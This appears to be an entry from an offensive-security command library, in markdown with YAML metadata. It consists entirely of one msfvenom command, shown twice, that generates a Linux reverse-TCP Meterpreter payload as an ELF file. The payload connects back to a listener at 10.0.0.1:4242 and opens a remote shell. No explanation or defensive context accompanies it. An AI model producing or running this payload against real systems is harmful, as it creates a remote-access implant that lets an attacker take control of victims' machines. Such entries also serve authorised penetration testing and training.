---
id: d7bc3f99-37bd-4203-9949-46f01864396a
name: Generate Linux reverse meterpreter payload
type: command
executor: bash
data: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf
  >reverse.elf
output: null
created_at: '2023-04-06T03:56:24.868978+00:00'
updated_at: '2023-04-10T20:25:32.401145+00:00'
---

# Generate Linux reverse meterpreter payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```
